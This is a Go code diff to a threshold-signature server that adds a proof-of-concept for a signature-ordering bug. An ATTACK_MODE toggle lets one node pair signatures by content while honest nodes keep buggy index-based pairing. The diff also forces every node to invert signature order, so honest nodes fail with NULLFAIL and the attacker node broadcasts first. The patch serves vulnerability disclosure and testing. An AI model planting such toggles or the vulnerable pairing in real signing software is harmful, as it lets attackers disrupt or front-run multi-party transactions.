@@ -278,11 +278,35 @@ func (t *TssServer) KeySign(req keysign.Request) (keysign.Response, error) {
 		msgsToSign = append(msgsToSign, msgToSign)
 	}
 
-	// PoC: ATTACK_MODE toggle for demonstrating signature ordering vulnerability
-	// ATTACK_MODE=true: Sort in DESCENDING order (inverted) to mismatch with honest nodes
-	// ATTACK_MODE=false/unset: Sort in ASCENDING order (fixed behavior)
+	// PoC: TSS signature ordering vulnerability demonstration
+	//
+	// THE BUG (original mainnet code):
+	//   - Messages sorted DESCENDING by hash: [highest, ..., lowest]
+	//   - TSS returns signatures in completion order (varies with timing)
+	//   - Index-based pairing: sig[i] → msg[i] = WRONG if order differs!
+	//   - Result: NULLFAIL when signature doesn't match message
+	//
+	// THE FIX:
+	//   - Content-based pairing: match signature.M to message hash
+	//   - Works regardless of signature completion order
+	//
+	// PoC DEMONSTRATION:
+	//   - ALL nodes see inverted signatures (forced in batchSignatures)
+	//   - Nodes 1, 2, 3 (ATTACK_MODE unset): index-based pairing (buggy)
+	//     → Mispairs inverted signatures → NULLFAIL
+	//   - Node 4 (ATTACK_MODE=true, bifrost-pig): content-based pairing (fix)
+	//     → Correctly matches by hash → valid tx, broadcast first
 	attackMode := os.Getenv("ATTACK_MODE") == "true"
 
+	// Log pre-sort state
+	t.logger.Info().
+		Bool("attackMode", attackMode).
+		Int("messageCount", len(msgsToSign)).
+		Str("sortOrder", "HASH DESCENDING (all nodes same)").
+		Msg("PoC: keysign message sorting")
+
+	// Sort messages by hash DESCENDING - this is the VULNERABLE mainnet code
+	// ALL nodes must sort the same way for TSS to complete
 	sort.SliceStable(msgsToSign, func(i, j int) bool {
 		ma, err := common.MsgToHashInt(msgsToSign[i], algo)
 		if err != nil {
@@ -292,14 +316,26 @@ func (t *TssServer) KeySign(req keysign.Request) (keysign.Response, error) {
 		if err != nil {
 			t.logger.Error().Err(err).Msgf("fail to convert the hash value")
 		}
-		if attackMode {
-			// ATTACK: Descending order (inverted)
-			return ma.Cmp(mb) == 1 // NOTE: == 1 instead of == -1
-		} else {
-			// FIXED: Ascending order (normal)
-			return ma.Cmp(mb) == -1
+		// DESCENDING sort (THE BUG) - all nodes use this
+		if ma.Cmp(mb) == -1 {
+			return false
 		}
+		return true
 	})
+
+	// Log the sorted message order
+	if len(msgsToSign) > 1 {
+		hashOrder := make([]string, len(msgsToSign))
+		for i, msg := range msgsToSign {
+			h, _ := common.MsgToHashInt(msg, algo)
+			if h != nil {
+				hashOrder[i] = h.Text(16)[:8]
+			}
+		}
+		t.logger.Info().
+			Strs("hashOrder", hashOrder).
+			Msg("PoC: messages sorted by hash DESCENDING")
+	}
 
 	oldJoinParty, err := conversion.VersionLTCheck(req.Version, messages.NEWJOINPARTYVERSION)
 	if err != nil {
@@ -331,6 +367,10 @@ func (t *TssServer) KeySign(req keysign.Request) (keysign.Response, error) {
 	wg := sync.WaitGroup{}
 	wg.Add(2)
 	keysignStartTime := time.Now()
+	t.logger.Info().
+		Int("messageCount", len(msgsToSign)).
+		Bool("attackMode", attackMode).
+		Msg("PoC: starting TSS keysign")
 	msgsCopy := make([][]byte, len(msgsToSign))
 	for i, msg := range msgsToSign {
 		msgsCopy[i] = make([]byte, len(msg))
@@ -359,6 +399,16 @@ func (t *TssServer) KeySign(req keysign.Request) (keysign.Response, error) {
 	wg.Wait()
 	close(sigChan)
 	keysignTime := time.Since(keysignStartTime)
+
+	// PoC: Log keysign completion timing
+	t.logger.Info().
+		Dur("keysignDuration", keysignTime).
+		Bool("attackMode", attackMode).
+		Int("messageCount", len(msgsToSign)).
+		Bool("receivedFromPeer", errWait == nil).
+		Bool("generatedLocally", errGen == nil).
+		Msg("PoC: TSS keysign completed")
+
 	// we received the generated verified signature, so we return
 	if errWait == nil {
 		t.updateKeySignResult(receivedSig, keysignTime)
@@ -381,16 +431,51 @@ func (t *TssServer) broadcastKeysignFailure(messageID string, peers []peer.ID) {
 }
 
 func (t *TssServer) batchSignatures(algo tcommon.SigningAlgo, sigs []*tsslibcommon.SignatureData, msgsToSign [][]byte) keysign.Response {
-	// PoC: ATTACK_MODE enables content-based pairing so attacker can broadcast valid tx
-	// Non-attack mode uses index-based pairing (buggy behavior) for demonstration
+	// PoC: Vulnerability demonstration through forced signature inversion
+	//
+	// ALL NODES invert signature order (simulates timing-based reordering in network)
+	//
+	// ATTACK_MODE=true (bifrost-pig only):
+	//   - Uses CONTENT-BASED pairing (the fix the attacker discovered)
+	//   - Handles inverted order correctly → produces valid transaction
+	//
+	// ATTACK_MODE unset/false (all other nodes - honest majority):
+	//   - Uses INDEX-BASED pairing (the buggy mainnet code)
+	//   - Mispairs inverted signatures → NULLFAIL error
 	attackMode := os.Getenv("ATTACK_MODE") == "true"
+
+	// PoC: ALL nodes invert the signature order
+	// This simulates what happens when signatures complete in reverse order due to timing
+	if len(sigs) > 1 {
+		t.logger.Info().
+			Int("signatureCount", len(sigs)).
+			Msg("PoC: INVERTING signature order (simulating timing-based reordering)")
+
+		// Reverse the signatures array
+		for i, j := 0, len(sigs)-1; i < j; i, j = i+1, j-1 {
+			sigs[i], sigs[j] = sigs[j], sigs[i]
+		}
+	}
+
+	// PoC: Log signature pairing mode
+	t.logger.Info().
+		Bool("attackMode", attackMode).
+		Int("signatureCount", len(sigs)).
+		Int("messageCount", len(msgsToSign)).
+		Str("pairingMode", func() string {
+			if attackMode {
+				return "CONTENT-BASED (attacker has fix - handles inverted order)"
+			}
+			return "INDEX-BASED (buggy - will produce NULLFAIL)"
+		}()).
+		Msg("PoC: batching signatures with pairing mode")
 
 	var signatures []keysign.Signature
 
 	if attackMode {
 		// ATTACK MODE: Content-based signature pairing (THE FIX)
-		// This allows the attacker node to correctly match signatures to messages
-		// regardless of ordering, producing a valid transaction to broadcast
+		// bifrost-pig uses this - correctly matches signatures to messages by content
+		// even when signature order is inverted
 
 		// Build message hash map for content-based matching
 		msgMap := make(map[string][]byte)
@@ -441,8 +526,10 @@ func (t *TssServer) batchSignatures(algo tcommon.SigningAlgo, sigs []*tsslibcomm
 			signatures = append(signatures, signature)
 		}
 	} else {
-		// NORMAL MODE: Index-based signature pairing (BUGGY BEHAVIOR)
-		// This is the vulnerable code that assumes signatures are in same order as messages
+		// NON-ATTACK MODE (honest nodes): Index-based signature pairing (BUGGY BEHAVIOR)
+		// Honest nodes use the vulnerable mainnet code that pairs by index
+		// With inverted signatures: sig[i] paired with msg[i], but sig[i] was for msg[n-i-1]
+		// Result: wrong signature for message → NULLFAIL error when broadcast
 		for i, sig := range sigs {
 			sigg := sig.GetSignature()
 			var signature keysign.Signature
